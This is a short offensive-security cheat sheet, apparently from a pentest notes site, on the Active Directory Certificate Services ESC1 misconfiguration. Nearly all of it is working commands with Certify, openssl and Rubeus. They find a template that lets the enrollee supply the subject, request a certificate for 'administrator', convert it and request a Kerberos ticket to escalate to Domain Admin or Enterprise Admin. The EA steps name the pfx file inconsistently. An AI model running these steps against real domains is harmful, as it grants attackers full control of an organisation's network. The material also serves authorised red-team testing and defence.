# ESC1

{% hint style="info" %}
Enrolee can request cert for ANY user
{% endhint %}

### Tools

* [Certify](https://github.com/GhostPack/Certify)
* [Certipy](https://github.com/ly4k/Certipy)

**Find template that has ENROLLEE\_SUPPLIES\_SUBJECT value for msPKI-Certificates-Name-Flag.**&#x20;

* `Certify.exe find /enrolleeSuppliesSubject`&#x20;
* Target template allows enrollment to the target group where the compromised user is a member

### **Escalation to DA**

*  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:administrator`&#x20;
* **Convert from cert.pem to pfx and use it to request a TGT for DA.**
  * `openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc1.pfx`
* `Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /ptt (/password:SecretPass@123) - optional`&#x20;

### Escalation to EA

*  `Certify.exe request /ca:<CA-ServerDomain><CA-Username>/template:<target-template-name> /altname:<parent-domain>\administrator`&#x20;
* **Convert from cert.pem to pfx and use it to request a TGT for EA.**
  * `openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out     esc3.pfx`
* `Rubeus.exe asktgt /user:<Parent-Domain-FQDN>\administrator /certificate:esc1.pfx /dc:<parent-domain-dc> /ptt (/password:SecretPass@123) - optional` &#x20;
